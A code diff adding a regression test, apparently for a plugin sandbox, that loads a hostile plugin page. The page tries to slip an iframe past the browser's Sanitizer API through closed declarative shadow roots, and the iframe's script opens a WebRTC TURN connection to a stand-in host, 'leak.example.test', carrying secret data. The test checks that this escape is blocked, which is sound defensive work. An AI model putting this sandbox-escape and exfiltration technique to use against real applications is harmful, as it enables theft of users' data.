@@ -685,6 +685,139 @@ const XSLT_SHADOW_ATTACK_HTML = `<!doctype html>
 </html>`;
 
 /**
+ * Round 13. The same closed-shadow-root escape again, through the two HTML
+ * *document* parser entry points the Sanitizer API added and nothing locks:
+ * `Element.prototype.setHTML` / `ShadowRoot.prototype.setHTML` and the static
+ * `Document.parseHTML`.
+ *
+ * `KILL_CHILD_REALMS` denies `document.write`, `writeln`, `Document.parseHTMLUnsafe`,
+ * `Element/ShadowRoot.setHTMLUnsafe` and both `XSLTProcessor` transforms. The
+ * *safe* halves of the same API pair are not in that list, and the Sanitizer spec
+ * parses with declarative shadow roots enabled for both — the sanitiser then runs
+ * over the result. Whether a closed root and an `<iframe srcdoc>` survive that
+ * sanitisation is the whole question, and it is measured here rather than
+ * reasoned about.
+ */
+const SANITIZER_SHADOW_ATTACK_HTML = `<!doctype html>
+<html>
+  <body>
+    <script>
+      var CHILD = "&lt;script&gt;var ice='no';try{var pc=new RTCPeerConnection(" +
+        "{iceServers:[{urls:'turn:leak.example.test:3478'," +
+        "username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');" +
+        "ice='gathering'}catch(e){ice='threw'}parent.parent.postMessage(" +
+        "{exfil:1,type:'child',tag:'TAG',rtc:typeof RTCPeerConnection,ice:ice},'*');&lt;/script&gt;";
+
+      // The same child, for the \`srcdoc\` *property* rather than an attribute the
+      // HTML parser decodes on the way in.
+      var RAW_CHILD = "<script>var ice='no';try{var pc=new RTCPeerConnection(" +
+        "{iceServers:[{urls:'turn:leak.example.test:3478'," +
+        "username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');" +
+        "ice='gathering'}catch(e){ice='threw'}parent.parent.postMessage(" +
+        "{exfil:1,type:'child',tag:'TAG',rtc:typeof RTCPeerConnection,ice:ice},'*');<\\/script>";
+
+      function markup(tag) {
+        return "<div id='sanhost'><template shadowrootmode='closed'>" +
+          "<iframe srcdoc=\\"" + CHILD.replace("TAG", tag) + "\\"></iframe>" +
+          "</template></div>";
+      }
+
+      function describe(host) {
+        if (!host) return "nohost";
+        // A DSD-aware parse consumes the <template> and leaves a closed root, so
+        // the host has no children and no readable shadowRoot.
+        return "kids=" + host.childNodes.length + ";shadow=" + (host.shadowRoot ? "open" : "none");
+      }
+
+      // A defined custom element, because \`ElementInternals.shadowRoot\` is the
+      // way back into a *declarative* closed root: a root the HTML parser makes
+      // has "available to element internals" set, unlike one from attachShadow.
+      try {
+        customElements.define("x-host", class extends HTMLElement {});
+      } catch (error) {}
+
+      // Nothing dangerous inside the template, so the safe sanitiser has no
+      // reason to strip it. The frame goes in afterwards, through internals.
+      var HOST = "<x-host id='sanhost'><template shadowrootmode='closed'>" +
+        "<span id='inner'></span></template></x-host>";
+      var CONFIG = {
+        sanitizer: {
+          elements: ["div", "span", "template", "iframe", "x-host"],
+          attributes: ["id", "srcdoc", "shadowrootmode"]
+        }
+      };
+
+      function reach(host, tag, notes) {
+        if (!host) { notes.push(tag + ":nohost"); return; }
+        notes.push(tag + ":" + describe(host));
+        var root = null;
+        try { root = host.attachInternals().shadowRoot; } catch (error) {
+          notes.push(tag + ":internals:threw:" + (error && error.name));
+        }
+        notes.push(tag + ":internalsRoot=" + (root ? root.mode : "null"));
+        if (!root) return;
+        // A frame inserted into a closed root: no MutationObserver on the
+        // document is told, and querySelectorAll does not cross the boundary.
+        try {
+          var frame = document.createElement("iframe");
+          frame.srcdoc = RAW_CHILD.replace("TAG", tag);
+          root.appendChild(frame);
+        } catch (error) {
+          notes.push(tag + ":plant:threw:" + (error && error.name));
+        }
+      }
+
+      window.addEventListener("message", function (event) {
+        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;
+
+        var notes = ["api:setHTML=" + typeof Element.prototype.setHTML +
+          ";parseHTML=" + typeof Document.parseHTML +
+          ";docSetHTMLUnsafe=" + typeof Document.prototype.setHTMLUnsafe];
+
+        // 1. The safe setter on a live element, default sanitiser, frame in the
+        //    markup — the direct form.
+        try {
+          var live = document.createElement("div");
+          document.body.appendChild(live);
+          live.setHTML(markup("setHTML-default"));
+          notes.push("setHTML:" + describe(live.querySelector("#sanhost")));
+        } catch (error) {
+          notes.push("setHTML:threw:" + (error && error.name));
+        }
+
+        // 2. The safe setter with a config that names what the attack needs,
+        //    and a template the sanitiser has no reason to touch.
+        try {
+          var wide = document.createElement("div");
+          document.body.appendChild(wide);
+          wide.setHTML(HOST, CONFIG);
+          reach(wide.querySelector("#sanhost"), "setHTMLWide", notes);
+        } catch (error) {
+          notes.push("setHTMLWide:threw:" + (error && error.name));
+        }
+
+        // 3. The static document parser, then adopt the host across.
+        try {
+          var parsed = Document.parseHTML(HOST, CONFIG);
+          var host = parsed.getElementById("sanhost");
+          if (host) document.body.appendChild(document.adoptNode(host));
+          reach(host, "parseHTML", notes);
+        } catch (error) {
+          notes.push("parseHTML:threw:" + (error && error.name));
+        }
+
+        setTimeout(function () {
+          notes.push("hostsConnected=" + document.querySelectorAll("#sanhost").length);
+          notes.push("framesConnected=" + document.querySelectorAll("iframe").length);
+          window.parent.postMessage({ exfil: 1, type: "swept", note: notes.join(" ") }, "*");
+        }, 700);
+      });
+      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
+    </script>
+  </body>
+</html>`;
+
+/**
  * Round 11. `SELECTOR` in `KILL_CHILD_REALMS` and the markup sanitiser in
  * `INSERT_PLUGIN_HTML` both enumerate the elements that can become a browsing
  * context as `iframe,frame,object,embed,link`. On the Electron desktop build
@@ -1207,6 +1340,52 @@ describe("a hostile plugin", () => {
     // denied outright, so the transform throws before there is a host to adopt.
     expect(childReports, note).toEqual([]);
     expect(note).toContain("hostConnected=0");
+  });
+
+  it("cannot get a closed shadow root out of the Sanitizer API", async () => {
+    const childReports: string[] = [];
+    let swept: string | null = null;
+    const onMessage = (event: MessageEvent) => {
+      const data = event.data as {
+        exfil?: number;
+        type?: string;
+        tag?: string;
+        ice?: string;
+        rtc?: string;
+        note?: string;
+      };
+      if (data?.exfil !== 1) {
+        return;
+      }
+      if (data.type === "child") {
+        childReports.push(`${data.tag}=rtc:${data.rtc};ice:${data.ice}`);
+      }
+      if (data.type === "swept") {
+        swept = data.note ?? "";
+      }
+      if (data.type === "ready") {
+        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
+      }
+    };
+    window.addEventListener("message", onMessage);
+
+    const iframe = createPluginIframe(SANITIZER_SHADOW_ATTACK_HTML);
+    document.body.appendChild(iframe);
+    cleanups.push(() => {
+      window.removeEventListener("message", onMessage);
+      iframe.remove();
+    });
+
+    const note = await waitFor(() => swept, "the Sanitizer shadow attack to finish");
+
+    // Nothing may report from inside a child realm: that report is the escape.
+    // The note rides in the failure message so a red run says which entry point
+    // honoured declarative shadow DOM and how far the host got.
+    expect(childReports, note).toEqual([]);
+    // Denied outright rather than surviving the sanitiser's own filtering: the
+    // default config happens to strip the frame today, and that is the
+    // sanitiser's policy to change, not ours.
+    expect(note).toContain("setHTMLWide:threw:");
   });
 
   it("cannot get an Electron webview guest into the document", async () => {
